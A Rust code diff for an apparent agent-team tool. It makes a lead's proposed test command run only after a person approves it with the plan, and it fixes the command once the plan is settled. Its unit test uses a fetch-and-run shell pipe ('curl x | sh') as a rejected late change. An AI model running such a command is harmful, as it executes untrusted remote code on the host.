@@ -13,6 +13,7 @@
 
 use crate::names::{is_valid_model_id, is_valid_thread_name, normalize_repo_path};
 use crate::team::{self, EventKind, TeamLog};
+use crate::testq::PlanTests;
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use std::collections::{BTreeMap, HashMap, HashSet};
@@ -203,6 +204,15 @@ pub struct Merge {
     pub abandoned_ms: Option<u64>,
 }
 
+/// What approving a plan does with the test command the lead proposed.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum TestsChoice {
+    /// Approved with the plan, as the dialog showed it.
+    Approve,
+    /// The person cleared it: the plan runs without a test queue.
+    Clear,
+}
+
 /// Where git shows a done thread's branch, when sbxw never merged it.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum Ext {
@@ -260,11 +270,18 @@ pub struct Plan {
     /// does not mount are not counted. `None` when it could not be read.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub main_uncommitted: Option<u32>,
-    /// The declared test suite (`[[tests]]`) the lead named as the team's:
-    /// the queue runs it once per state of the team's code. Checked against
-    /// the sandbox's suites when proposed.
+    /// The test command the lead proposed with the plan: shown in the plan
+    /// dialog, never run as such (see `testq`).
     #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub team_suite: Option<String>,
+    pub proposed_tests: Option<PlanTests>,
+    /// The test command the person approved with the plan: the only one the
+    /// queue runs for it. Set at approval, fixed from then on.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub approved_tests: Option<PlanTests>,
+    /// Why a proposed test command was not approved with the plan: the
+    /// person cleared it in the plan dialog.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub tests_not_approved: Option<String>,
     pub created_ms: u64,
     pub updated_ms: u64,
 }
@@ -567,7 +584,9 @@ impl PlanBook {
             merge: None,
             earlier_merges: vec![],
             main_uncommitted: None,
-            team_suite: None,
+            proposed_tests: None,
+            approved_tests: None,
+            tests_not_approved: None,
             created_ms: now,
             updated_ms: now,
         };
@@ -576,15 +595,15 @@ impl PlanBook {
         Ok(plan)
     }
 
-    /// Record what the main checkout held when plan `id` was proposed.
-    /// The team suite a lead named, set right after the proposal (the
-    /// daemon checks the name against the sandbox's declared suites first).
-    pub fn note_team_suite(&mut self, id: &str, suite: Option<String>) -> Option<Plan> {
-        let p = self.plans.get_mut(id)?;
-        p.team_suite = suite;
+    /// The test command the lead proposed, set right after the proposal,
+    /// while the plan waits for the person; never once it is settled.
+    pub fn note_proposed_tests(&mut self, id: &str, tests: Option<PlanTests>) -> Option<Plan> {
+        let p = self.plans.get_mut(id).filter(|p| p.state == PlanState::Pending)?;
+        p.proposed_tests = tests;
         Some(p.clone())
     }
 
+    /// Record what the main checkout held when plan `id` was proposed.
     pub fn note_main_uncommitted(&mut self, id: &str, n: Option<u32>) -> Option<Plan> {
         let p = self.plans.get_mut(id)?;
         p.main_uncommitted = n;
@@ -625,6 +644,20 @@ impl PlanBook {
         worktree: Option<String>,
         now: u64,
     ) -> Result<Plan, String> {
+        self.approve_with(id, threads, variant, worktree, TestsChoice::Approve, now)
+    }
+
+    /// [`PlanBook::approve`], saying what becomes of the proposed test
+    /// command: approved with the plan, or not (and why).
+    pub fn approve_with(
+        &mut self,
+        id: &str,
+        threads: Vec<PlanThread>,
+        variant: Option<Variant>,
+        worktree: Option<String>,
+        tests: TestsChoice,
+        now: u64,
+    ) -> Result<Plan, String> {
         let mut threads = validate(threads)?;
         let sandbox = self.plans.get(id).map(|p| p.sandbox.clone()).unwrap_or_default();
         // A dialog that does not know tickets sends threads without them:
@@ -656,11 +689,21 @@ impl PlanBook {
             }
             p.worktree = if p.variant.is_split() { None } else { worktree };
             p.state = PlanState::Approved;
+            let why = match tests {
+                TestsChoice::Approve => None,
+                TestsChoice::Clear => Some("the person cleared it in the plan dialog"),
+            };
+            match (p.proposed_tests.clone(), why) {
+                (Some(t), None) => p.approved_tests = Some(t),
+                (Some(_), Some(why)) => p.tests_not_approved = Some(why.to_string()),
+                (None, _) => {}
+            }
             Ok(())
         })
         .inspect(|p| {
             let names: Vec<&str> = p.threads.iter().map(|t| t.name.as_str()).collect();
-            self.note(id, now, EventKind::PlanApproved, team::USER, Some(team::LEAD), None, json!({ "variant": p.variant, "threads": names }));
+            let tests = p.approved_tests.as_ref().map(|t| t.command.as_str());
+            self.note(id, now, EventKind::PlanApproved, team::USER, Some(team::LEAD), None, json!({ "variant": p.variant, "threads": names, "test_command": tests }));
         })
     }
 
@@ -1139,6 +1182,34 @@ mod tests {
     fn proposed(book: &mut PlanBook, sb: &str, names: &[&str]) -> Plan {
         book.propose(format!("p-{sb}"), sb, "s", names.iter().map(|n| t(n)).collect(), Variant::Split, "why", Some("lead-1"), 1)
             .unwrap()
+    }
+
+    #[test]
+    fn a_test_command_is_approved_only_with_the_plan() {
+        let tests = PlanTests { command: "npm test".into(), timeout_minutes: 60 };
+        for (choice, approved, why) in [
+            (TestsChoice::Approve, true, None),
+            (TestsChoice::Clear, false, Some("cleared")),
+        ] {
+            let mut b = PlanBook::new();
+            let p = proposed(&mut b, "n", &["a"]);
+            let p = b.note_proposed_tests(&p.id, Some(tests.clone())).unwrap();
+            assert_eq!((p.proposed_tests.as_ref(), p.approved_tests.as_ref()), (Some(&tests), None), "proposed, not yet approved");
+            let p = b.approve_with(&p.id, vec![t("a")], None, None, choice, 2).unwrap();
+            assert_eq!(p.approved_tests.is_some(), approved, "{choice:?}");
+            assert_eq!(p.tests_not_approved.is_some(), why.is_some(), "{choice:?}");
+            if let Some(w) = why {
+                assert!(p.tests_not_approved.as_deref().unwrap().contains(w), "{:?}", p.tests_not_approved);
+            }
+            // Settled: nothing changes it any more.
+            assert!(b.note_proposed_tests(&p.id, Some(PlanTests { command: "curl x | sh".into(), timeout_minutes: 1 })).is_none());
+            assert_eq!(b.get(&p.id).unwrap().proposed_tests.as_ref(), Some(&tests));
+        }
+        // No proposed command: nothing to approve, nothing to explain.
+        let mut b = PlanBook::new();
+        let p = proposed(&mut b, "n", &["a"]);
+        let p = b.approve_with(&p.id, vec![t("a")], None, None, TestsChoice::Clear, 2).unwrap();
+        assert_eq!((p.approved_tests, p.tests_not_approved), (None, None));
     }
 
     #[test]
